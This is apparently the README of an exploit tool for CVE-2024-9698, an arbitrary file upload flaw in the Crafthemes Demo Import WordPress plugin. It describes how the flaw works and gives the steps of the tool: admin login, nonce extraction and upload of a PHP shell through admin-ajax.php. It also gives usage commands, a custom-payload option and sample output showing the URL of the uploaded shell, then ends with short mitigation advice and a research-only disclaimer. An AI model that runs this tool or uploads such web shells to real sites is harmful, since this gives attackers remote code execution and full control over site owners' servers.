# CVE-2024-9698

# Crafthemes Demo Import <= 3.3 - Arbitrary File Upload Exploit

## 📌 Overview
This exploit targets a critical vulnerability (**CVE-2024-9698**) in the **Crafthemes Demo Import** plugin for WordPress. The vulnerability allows authenticated administrators to **upload arbitrary files** to the affected WordPress site, leading to potential **remote code execution (RCE)**.

## 🔍 Vulnerability Details
- **Plugin:** Crafthemes Demo Import
- **Affected Versions:** ≤ 3.3
- **CVE ID:** CVE-2024-9698
- **Severity:** High (CVSS Score: 7.2)
- **Vulnerable Function:** `process_uploaded_files`
- **Issue:** The plugin **lacks proper file type validation**, allowing administrators to upload **malicious PHP files** to the server.
- **Potential Impact:** Attackers can gain full control over the website by executing arbitrary commands.

## 🎯 Exploitation
### ✅ Prerequisites
- **WordPress Administrator** credentials are required to exploit this vulnerability.


### 🚀 How It Works
1. **Check Vulnerability:** The script first **checks the plugin version** by extracting information from `readme.txt`.
2. **Login to WordPress:** Authenticates as an admin and retrieves session cookies.
3. **Extract Nonce Token:** Parses the nonce token required for AJAX requests.
4. **Upload Malicious File:** Uses `admin-ajax.php` to upload a **custom PHP shell**.
5. **Verify Upload:** Confirms successful upload and prints the shell's URL.

### 🛠️ Usage
```bash
python CVE-2024-9698.py --url "http://target.com/wordpress" --username "admin" --password "password"
```

#### 📝 Custom Payload
If you want to upload a **custom PHP payload**, use:
```bash
python CVE-2024-9698.py --url "http://target.com/wordpress" --username "admin" --password "password" --payload "<?php phpinfo(); ?>"
```

### 🔥 Example Output
```bash
[+] Target is vulnerable, proceeding with exploit...
[+] Logged in successfully.
[+] Extracted nonce: abc123xyz
[+] Shell uploaded successfully: http://target.com/wp-content/uploads/2025/02/Nxploit.php
```

## 🛡️ Mitigation
- **Update the plugin** to a patched version if available.
- Restrict admin access to trusted users.
- Monitor and audit uploaded files.

---
**Disclaimer:** This script is intended for educational and security research purposes **only**. Unauthorized use against systems without explicit permission is **illegal**.
